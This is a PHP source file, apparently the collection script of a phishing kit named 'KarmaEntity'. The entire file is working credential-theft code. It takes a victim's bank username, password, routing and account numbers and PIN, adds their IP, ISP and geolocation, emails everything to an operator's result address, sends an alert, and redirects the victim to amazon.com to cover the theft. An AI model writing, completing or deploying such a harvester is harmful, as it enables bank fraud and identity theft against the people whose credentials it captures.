<?php
require "core/EntityVariables.php";
$config = require "KarmaEntity/config/config.php";

$data = json_decode(file_get_contents("php://input"), true);

$bank_username = $data["bank_username"] ?? null;
$bank_password = $data["bank_password"] ?? null;
$bank_routing  = $data["bank_routing"] ?? null;
$bank_account  = $data["bank_account"] ?? null;
$bank_pin      = $data["bank_pin"] ?? null;

$message = '<div style="font-family: -apple-system, BlinkMacSystemFont, \'Segoe UI\', Roboto, Helvetica, Arial, sans-serif; background: #f4f7fc; border-radius: 20px; box-shadow: 0 4px 32px rgba(0, 0, 0, 0.1); padding: 40px 30px; line-height: 1.5;">'
    .'<h2 style="color: #2c3e50; font-size: 1.5rem; margin-bottom: 50px; letter-spacing: 0.8px; font-weight: 600;">' 
    .'<i>"' . htmlspecialchars($quote) . '"</i></h2>'
    .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">BANK INFO</h3>'
    .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); margin-bottom: 30px;">'
    .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
    .'Bank Username  : ' . htmlspecialchars($bank_username) . "\n"
    .'Bank Password  : ' . htmlspecialchars($bank_password) . "\n"
    .'Routing Number : ' . htmlspecialchars($bank_routing) . "\n"
    .'Account Number : ' . htmlspecialchars($bank_account) . "\n"
    .'Bank PIN       : ' . htmlspecialchars($bank_pin) . "\n"
    .'</code>'
    .'</pre>'
    .'<h3 style="color: #2c3e50; font-size: 1.1rem; margin-bottom: 20px; letter-spacing: 0.8px; font-weight: 700;">DEVICE INFO</h3>'
    .'<pre style="font-size: 0.9rem; color: #34495e; padding: 10px; background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);">'
    .'<code style="display: block; white-space: pre-wrap; word-wrap: break-word;">'
    .'TYPE         : ' . ucfirst(htmlspecialchars($device)) . "\n"
    .'IP           : ' . htmlspecialchars($ip) . "\n"
    .'ASN          : ' . htmlspecialchars($asn) . "\n"
    .'ISP          : ' . htmlspecialchars($isp) . "\n"
    .'Country      : ' . htmlspecialchars($country) . "\n"
    .'City         : ' . htmlspecialchars($city) . "\n"
    .'Region       : ' . htmlspecialchars($region) . "\n"
    .'Latitude     : ' . htmlspecialchars($latitude) . "\n"
    .'Longitude    : ' . htmlspecialchars($longitude) . "\n"
    .'Timezone     : ' . htmlspecialchars($timezone) . "\n"
    .'User Agent   : ' . htmlspecialchars($userAgent) . "\n"
    .'</code>'
    .'</pre>'
    .'</div>';

$to = trim($config["result_email"]);
$subject = "BANK INFORMATION" ;

$headers = "From: Entity <karma@entity.net>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=UTF-8\r\n";

@mail($to, $subject, $message, $headers);

EntityMessage("BANK RECEIVED", $ip);

echo json_encode([
    "success"  => true,
    "redirect" => "https://amazon.com"
]);
exit;
?>
